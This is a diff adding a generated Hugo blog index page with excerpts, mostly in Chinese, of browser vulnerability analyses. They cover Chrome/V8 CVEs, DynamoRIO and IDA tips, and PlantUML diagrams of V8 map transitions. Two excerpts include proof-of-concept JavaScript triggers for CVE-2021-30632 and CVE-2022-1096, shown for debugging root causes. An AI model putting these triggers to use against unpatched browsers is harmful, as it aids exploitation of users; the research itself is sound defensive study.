@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>My New Hugo Site</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="">
+    <meta name="generator" content="Hugo 0.139.2">
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+    
+
+    
+      
+
+    
+
+    
+    
+      <link href="/posts/index.xml" rel="alternate" type="application/rss+xml" title="My New Hugo Site" />
+      <link href="/posts/index.xml" rel="feed" type="application/rss+xml" title="My New Hugo Site" />
+      
+    
+
+    
+      <link rel="canonical" href="http://localhost:1313/posts/">
+    
+
+    <meta property="og:url" content="http://localhost:1313/posts/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Posts">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="website">
+
+  <meta itemprop="name" content="Posts">
+  <meta itemprop="datePublished" content="2024-11-29T16:25:02+08:00">
+  <meta itemprop="dateModified" content="2024-11-29T16:25:02+08:00">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Posts">
+
+	
+  </head><body class="ma0 avenir bg-near-white development">
+
+    
+
+  <header>
+    <div class="pb3-m pb6-l bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        My New Hugo Site
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+      <div class="ananke-socials"></div>
+
+    </div>
+  </div>
+</nav>
+
+      <div class="tc-l pv3 ph3 ph4-ns">
+        <h1 class="f2 f-subheadline-l fw2 light-silver mb0 lh-title">
+          Posts
+        </h1>
+        
+      </div>
+    </div>
+  </header>
+
+
+    <main class="pb7" role="main">
+      
+  <article class="pa3 pa4-ns nested-copy-line-height">
+    <section class="cf ph3 ph5-l pv3 pv4-l f4 tc-l center measure-wide lh-copy mid-gray"></section>
+    <section class="flex-ns flex-wrap justify-around mt5">
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+            <div class="mb3 pa4 mid-gray overflow-hidden">
+    
+    <h1 class="f3 near-black">
+      <a href="/posts/2022-06-03-cve-2020-16009/" class="link black dim">
+        CVE-2020-16009 （WIP）
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <p>分析在野利用 <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-16009.html">CVE-2020-16009</a>。</p>
+<h2 id="复现">复现</h2>
+<p>下载 <a href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/796621/">Chrome 86.0.4230.1</a>，</p>
+    </div>
+  <a href="/posts/2022-06-03-cve-2020-16009/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/2023-02-21-cve-2021-30632/" class="link black dim">
+        CVE-2021-30632 Analysis
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <p>打算练习一下英文写作，所以这篇尝试用英文写。</p>
+<p>Analysis V8 vulnerability CVE-2021-30632.</p>
+<h2 id="enviroment">Enviroment</h2>
+<h3 id="get-vulnerable-exe">Get Vulnerable Exe</h3>
+<p>According to <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html">google P0 0day-RCAs</a>, this vulnerability affects version pre 93.0.4577.82. With the help of <a href="https://vikyd.github.io/download-chromium-history-version/#/">https://vikyd.github.io/download-chromium-history-version/#/</a>, I got the download url of chromium 93.0.4573.1 Win64 with pdb file, <a href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/900323/">https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/900323/</a>. I also built a debug version of chromium for a better debugging experience.</p>
+<h2 id="prepare-poc">Prepare POC</h2>
+<p>Steal this POC code from Google P0 0day RCAs page.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">store</span>(<span style="color:#a6e22e">y</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">y</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">load</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">b</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">a</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x1</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">a</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x2</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">a</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">3</span>};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x3</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">a</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">4</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">store</span>(<span style="color:#a6e22e">x1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">store</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">store</span>(<span style="color:#a6e22e">x2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x1</span>.<span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">OptimizeFunctionOnNextCall</span>(<span style="color:#a6e22e">store</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">store</span>(<span style="color:#a6e22e">x2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">load</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">load</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">OptimizeFunctionOnNextCall</span>(<span style="color:#a6e22e">load</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">load</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">store</span>(<span style="color:#a6e22e">x3</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">load</span>());
+</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>use <code>python -m http.server 9999</code>  create a site at port 9999.</p>
+    </div>
+    <a href="/posts/2023-02-21-cve-2021-30632/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/2022-11-26-cve-2022-1096/" class="link black dim">
+        CVE-2022-1096 (WIP)
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <p>CVE-2022-1096 是 CVE-2021-30551 的变种。</p>
+<h2 id="准备环境">准备环境</h2>
+<p>阅读 <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1096.html">Google P0 的分析报告</a> 得知修复的版本是 99.0.4844.84，搜到对应的<a href="https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_25.html">发布记录</a>，依照时间找到上一个版本是 <a href="https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_20.html">99.0.4844.82</a>，使用 <a href="2022-05-31-get-old-version-chrome-binary.md">获取旧版本的 Chrome</a> 中的方法构建出对应的二进制文件。</p>
+<h2 id="分析成因">分析成因</h2>
+<p>将 POC 代码稍加修改，方便调试：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">style</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>).<span style="color:#a6e22e">style</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">toString</span><span style="color:#f92672">:</span> () =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}};
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">2</span>)
+</span></span></code></pre></div><p>根据之前调试 CVE-2021-30551 积累的经验，漏洞是在 v8/src/objects/objects.cc：<code>Object::SetProperty</code> 函数执行过程中触发的，在 alert(1) 弹出后，在 Object::SetProperty 函数开头下断点，然后点掉弹窗，让程序断下后开始调试。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>Maybe<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span><span style="color:#f92672">&gt;</span> Object<span style="color:#f92672">::</span>SetProperty(LookupIterator<span style="color:#f92672">*</span> it, Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> value,
+</span></span><span style="display:flex;"><span>                                StoreOrigin store_origin,
+</span></span><span style="display:flex;"><span>                                Maybe<span style="color:#f92672">&lt;</span>ShouldThrow<span style="color:#f92672">&gt;</span> should_throw) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (it<span style="color:#f92672">-&gt;</span>IsFound()) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> found <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>    Maybe<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span><span style="color:#f92672">&gt;</span> result <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>        SetPropertyInternal(it, value, should_throw, store_origin, <span style="color:#f92672">&amp;</span>found);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (found) <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>CheckContextualStoreToJSGlobalObject(it, should_throw)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> Nothing<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">bool</span><span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">AddDataProperty</span>(it, value, NONE, should_throw, store_origin);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>大体和 CVE-2021-30551 的流程一致，虽然 style 对象还没有名为 prop 的属性，但是由于 style 是设置了 INTERCEPTOR 的 DOM 对象， 属性的查找结果是找到了 INTERCEPTOR，it-&gt;IsFound() 条件满足，程序走到 SetPropertyInternal 中，经过多层调用，最终到达 V8CSSStyleDeclaration::NamedPropertySetterCallback 函调函数。</p>
+    </div>
+    <a href="/posts/2022-11-26-cve-2022-1096/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/2022-07-20-dynamo-rio-options/" class="link black dim">
+        DynamoRIO 常用参数
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <p>很多 Fuzzing 相关的工具，诸如 winAFL、lighthouse 都涉及到 DynamoRIO 的使用，记录一些常用的 DynamoRIO 参数便于解决在使用这些工具时遇到的问题。</p>
+<p>drrun 的参数</p>
+<ul>
+<li>-no_follow_children:
+默认情况下 DynamoRIO 会插装目标整个进程树，很多时候这并不是我们希望的动作，指定此参数后仅插装目标进程，忽略子进程。
+还可以指定仅插装指定的子进程</li>
+<li>-msgbox_mask _0xN：
+在指定事件发生时弹出消息窗，一般用在调试过程中。
+例如：发现目标进程运行一会就会崩溃，可以指定 -msgbox_mask 15, 这样目标进程启动后会弹出一个消息框，便于我们附加到目标进程上。</li>
+<li>更参数见 <a href="https://dynamorio.org/page_deploy.html#sec_options">DynamoRIO Runtime Options</a> 部分</li>
+</ul>
+    </div>
+    <a href="/posts/2022-07-20-dynamo-rio-options/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/2022-08-03-ida-pro-cpp-tips-collection/" class="link black dim">
+        IDA Pro Tips 整理
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <h2 id="来源">来源</h2>
+<p>这里记录的 Tips 都是从网上其他地方看到的，来源包括以下：</p>
+<ul>
+<li><a href="https://swarm.ptsecurity.com/ida-pro-tips/">https://swarm.ptsecurity.com/ida-pro-tips/</a></li>
+<li><a href="https://hex-rays.com/blog/tag/idatips/">https://hex-rays.com/blog/tag/idatips/</a></li>
+</ul>
+<h2 id="逆向-cpp-对象">逆向 CPP 对象</h2>
+<ul>
+<li>IDA 内置了对 CPP 虚函数表的支持，只要把结构体中虚表对应的成员名为设置为 __vtable，类型名设置为 Xxx_vtbl 即可: <a href="https://www.hex-rays.com/products/ida/support/idadoc/1691.shtml">https://www.hex-rays.com/products/ida/support/idadoc/1691.shtml</a></li>
+<li>快速创建结构体：https://hex-rays.com/blog/igor-tip-of-the-week-11-quickly-creating-structures/
+<ul>
+<li>选中的常量数据，右键菜单创建结构体</li>
+<li>在 local types 窗口，用 C 代码创建</li>
+</ul>
+</li>
+<li>逆向 CPP 代码时，经常可以在构造函数之前的 new 语句处得知对象的总大小，但不知道每个成员的意义和大小，可以用 <a href="https://hex-rays.com/blog/igor-tip-of-the-week-12-creating-structures-with-known-size/">https://hex-rays.com/blog/igor-tip-of-the-week-12-creating-structures-with-known-size/</a> 介绍的方法先创建出一组哑成员，后面再慢慢的逆向出各成员的意义</li>
+</ul>
+    </div>
+    <a href="/posts/2022-08-03-ida-pro-cpp-tips-collection/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/2022-06-11-plantuml-source-code/" class="link black dim">
+        PlantUML 源码备份
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <p>本文用来备份博客中出现的 PlantUML 图的源码。</p>
+<h2 id="cve-2021-30551">CVE-2021-30551</h2>
+<pre tabindex="0"><code class="language-plantuml-svg" data-lang="plantuml-svg">@startuml
+map transitions_1 {
+corrupted_prop =&gt;
+}
+
+map transitions_2 {
+corrupted_prop =&gt;
+}
+
+map map_1 {
+transitions *-&gt; transitions_1
+descriptors =&gt; [regular_prop]
+}
+
+map transitions_0 {
+regular_prop =&gt;
+}
+
+map map_2 {
+transitions *-&gt; transitions_2
+descriptors =&gt; [regular_prop, corrupted_prop]
+}
+
+map object_1 {
+map *-&gt; map_2
+}
+
+map map_3 {
+transitions =&gt; null
+descriptors =&gt; [regular_prop, corrupted_prop, corrupted_prop]
+}
+
+map object_2 {
+map *-&gt; map_3
+}
+
+map map_0 {
+transitions *-&gt; transitions_0
+descriptors =&gt; []
+}
+
+transitions_0::regular_prop ==&gt; map_1
+transitions_1::corrupted_prop ==&gt; map_2
+transitions_2::corrupted_prop ==&gt; map_3
+@enduml
+</code></pre><pre tabindex="0"><code class="language-plantuml-svg" data-lang="plantuml-svg">@startuml
+
+package deprecated {
+map transitions_1 {
+corrupted_prop =&gt;
+}
+
+map transitions_2 {
+corrupted_prop =&gt;
+}
+
+map map_1 {
+transitions *-&gt; transitions_1
+descriptors =&gt; [regular_prop]
+}
+
+map map_2 {
+transitions *-&gt; transitions_2
+descriptors =&gt; [regular_prop, corrupted_prop]
+}
+
+
+map map_3 {
+transitions =&gt; null
+descriptors =&gt; [regular_prop, corrupted_prop, corrupted_prop]
+}
+
+
+transitions_1::corrupted_prop ==&gt; map_2
+transitions_2::corrupted_prop ==&gt; map_3
+}
+
+map object_2 {
+map *-&gt; deprecated.map_3
+}
+
+map transitions_3 {
+regular_prop =&gt;
+}
+
+map transitions_4 {
+corrupted_prop =&gt;
+}
+
+map transitions_5 {
+corrupted_prop =&gt;
+}
+
+map map_4 {
+transitions *-&gt; transitions_4
+descriptors =&gt; [regular_prop]
+}
+
+map map_5 {
+transitions *-&gt; transitions_5
+descriptors =&gt; [regular_prop, corrupted_prop]
+}
+
+map map_6 {
+transitions =&gt; null
+descriptors =&gt; [regular_prop, corrupted_prop, corrupted_prop]
+}
+
+map map_0 {
+transitions *-&gt; transitions_3
+descriptors =&gt; []
+}
+
+map object_1 {
+map *-&gt; map_6
+}
+
+
+
+transitions_3::regular_prop ==&gt; map_4
+transitions_4::corrupted_prop ==&gt; map_5
+transitions_5::corrupted_prop ==&gt; map_6
+@enduml
+</code></pre><h2 id="cve-2021-37975">CVE-2021-37975</h2>
+<pre tabindex="0"><code class="language-plantuml-svg" data-lang="plantuml-svg">object k_0
+object k_1
+object k_2
+object k_3
+
+map retMap {
+}
+
+map m_3 {
+k_2 =&gt;
+}
+
+map m_2 {
+k_2 =&gt;
+k_1 =&gt;
+}
+
+map m_1 {
+k_1 =&gt;
+k_0 =&gt;
+}
+
+map m_0 {
+k_0 =&gt;
+initKey =&gt;
+}
+
+map map1 {
+initKey =&gt;
+k_3 =&gt;
+}
+
+object initKey
+
+map1::k_3 =&gt; retMap
+map1::initKey ==&gt; m_0
+m_0::k_0 ==&gt; m_1
+m_1::k_1 ==&gt; m_2
+m_2::k_2 ==&gt; m_3
+
+m_0::initKey ==&gt; k_0
+m_1::k_0 ==&gt; k_1
+m_2::k_1 ==&gt; k_2
+m_3::k_2 ==&gt; k_3
+</code></pre><pre tabindex="0"><code class="language-plantuml" data-lang="plantuml">@startuml
+
+object k_0
+object k_1
+object k_2
+object k_3
+
+object k_5
+object k_7
+object k_9
+object k_8
+
+map m_8 {
+k_8 =&gt;
+}
+
+map m_7 {
+k_7 =&gt;
+k_8 =&gt;
+}
+
+map m_5 {
+k_3 =&gt;
+}
+
+object v9
+
+map retMap {
+k_5 =&gt;
+k_3 =&gt;
+}
+
+map m_3 {
+k_2 =&gt;
+}
+
+map m_2 {
+k_2 =&gt;
+k_1 =&gt;
+}
+
+map m_1 {
+k_1 =&gt;
+k_0 =&gt;
+}
+
+map m_0 {
+k_0 =&gt;
+initKey =&gt;
+}
+
+map map1 {
+initKey =&gt;
+k_3 =&gt;
+k_7 =&gt;
+k_9 =&gt;
+}
+
+object initKey
+
+map1::k_3 =&gt; retMap
+map1::initKey ==&gt; m_0
+m_0::k_0 ==&gt; m_1
+m_1::k_1 ==&gt; m_2
+m_2::k_2 ==&gt; m_3
+
+m_0::initKey ==&gt; k_0
+m_1::k_0 ==&gt; k_1
+m_2::k_1 ==&gt; k_2
+
+m_3::k_2 ==&gt; k_3
+
+map1::k_7 ==&gt; m_7
+map1::k_9 ==&gt; v9
+
+retMap::k_5 ==&gt; m_5
+retMap::k_3 ==&gt; k_5
+
+m_5::k_3 ==&gt; k_7
+m_7::k_8 ==&gt; m_8
+m_7::k_7 ==&gt; k_8
+
+m_8::k_8 ==&gt; k_9
+
+@enduml
+</code></pre><pre tabindex="0"><code class="language-plantuml" data-lang="plantuml">@startuml
+
+object k_0
+object k_1
+object k_2
+object k_3
+
+object k_5
+object k_7
+object k_9
+object k_8
+
+object Roots
+
+map m_8 {
+k_8 =&gt;
+}
+
+map m_7 {
+k_7 =&gt;
+k_8 =&gt;
+}
+
+map m_5 {
+k_3 =&gt;
+}
+
+object v9
+
+map retMap {
+k_5 =&gt;
+k_3 =&gt;
+}
+
+map m_3 {
+k_2 =&gt;
+}
+
+map m_2 {
+k_2 =&gt;
+k_1 =&gt;
+}
+
+map m_1 {
+k_1 =&gt;
+k_0 =&gt;
+}
+
+map m_0 {
+k_0 =&gt;
+initKey =&gt;
+}
+
+map map1 {
+initKey =&gt;
+k_3 =&gt;
+k_7 =&gt;
+k_9 =&gt;
+}
+
+object initKey
+
+map1::k_3 =&gt; retMap : 5
+
+map1::initKey ==&gt; m_0
+
+m_0::k_0 ==&gt; m_1 : 8
+m_0::initKey ==&gt; k_0 : 8
+
+m_1::k_0 ==&gt; k_1 : 7
+m_1::k_1 ==&gt; m_2 : 7
+
+m_2::k_2 ==&gt; m_3 : 6
+m_2::k_1 ==&gt; k_2 : 6
+
+m_3::k_2 ==&gt; k_3 : 5
+
+map1::k_7 ==&gt; m_7 : 3
+map1::k_9 ==&gt; v9 : 0
+
+retMap::k_5 ==&gt; m_5 : 4
+retMap::k_3 ==&gt; k_5 : 4
+
+m_5::k_3 ==&gt; k_7 : 3
+
+m_7::k_8 ==&gt; m_8 : 2
+m_7::k_7 ==&gt; k_8 : 2
+
+m_8::k_8 ==&gt; k_9 : 1
+
+Roots ==&gt; map1 : *
+Roots ==&gt; initKey : *
+
+k_9 o.. map1::k_9
+
+k_8 o.. m_7::k_8
+k_8 o.. m_8::k_8
+
+k_7 o.. m_7::k_7
+k_7 o.. map1::k_7
+
+k_5 o.. retMap::k_5
+k_3 o.. map1::k_3
+k_3 o.. retMap::k_3
+k_2 o.. m_3::k_2
+k_1 o.. m_1::k_1
+k_0 o.. m_0::k_0
+
+initKey o.. map1::initKey
+
+@enduml
+</code></pre>
+    </div>
+    <a href="/posts/2022-06-11-plantuml-source-code/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/2022-09-15-v8-ir-struct/" class="link black dim">
+        V8 IR 结构
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <h2 id="node">Node</h2>
+<p>每个节点都代表一次操作，由操作符和参数组成。</p>
+<h2 id="operator">Operator</h2>
+    </div>
+    <a href="/posts/2022-09-15-v8-ir-struct/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/2022-12-11-v8-documents/" class="link black dim">
+        v8 资料汇总
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <h2 id="v8-资料汇总">V8 资料汇总</h2>
+<p>v8 的资料虽然很多，但是很多是非官方的资料，或者没有一个统一的所搜入口，今天在 v8-dev 用户组发现一个不错的帖子，里面包含一些我以前没搜到过的资料，我就想我干脆自己整理一份，把我觉得非常值得读的资料都列到一篇文章里，以后不断更新。</p>
+<h3 id="121211-更新">12.12.11 更新</h3>
+<p>![截图](Pasted image 20221211203015.png)
+From: <a href="https://groups.google.com/g/v8-dev/c/J-lbjGeu6Yw">https://groups.google.com/g/v8-dev/c/J-lbjGeu6Yw</a></p>
+<ul>
+<li>The best way to start with V8 is to play around &ldquo;hello world&rdquo; at <a href="https://v8.dev/docs/embed">https://v8.dev/docs/embed</a> to find out the basics.   &ndash; 这篇是 v8 团队发的官方文章，大体上是讲怎么把 v8 当作嵌入式解释器使用，中间讲了很多 v8 的基本概念，入门必读。</li>
+<li>Then, <a href="https://github.com/thlorenz/v8-perf/blob/master/README.md">https://github.com/thlorenz/v8-perf/blob/master/README.md</a> will give you some links to find out how V8 works internally  - 包含介绍 v8 内部实现的很多内容，包括很多 v8 团队发布很多 talk 的视频和文档，我今天刚知道这个，还没仔细看</li>
+<li><a href="https://v8.dev/docs">https://v8.dev/docs</a> will explain some workflows to use. - 官方文档，也包括了 v8 个方面的内容，和第二个有一些内容是重复的，例如想了解 turbofan 可以看 <a href="https://v8.dev/docs/turbofan">https://v8.dev/docs/turbofan</a> ，个人感觉第二个的导航做的更好一些。</li>
+</ul>
+    </div>
+    <a href="/posts/2022-12-11-v8-documents/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/2022-05-26-cve-2019-13720/" class="link black dim">
+        分析 CVE-2019-13720
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <h1 id="cve-2019-13720">CVE-2019-13720</h1>
+<p>分析<a href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/">卡巴斯基</a> 2019 年披露的在野利用 <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-13720.html">CVE-2019-13720</a>。</p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<h3 id="复现">复现</h3>
+<p><a href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/">分析报告</a> 记录了受影响的 Chrome 版本号 76.0.3809.87，依照<a href="2022-05-31-get-old-version-chrome-binary.md">获取旧版本的 Chrome</a> 中记录的方法，构建出 Chrome.exe。</p>
+<hr>
+<p><strong>ℹ️NOTE</strong>：编译使用的 Clang 与最新的 MSVC 运行时不兼容，编译此版本需要安装 Visual Studio 2017</p>
+<hr>
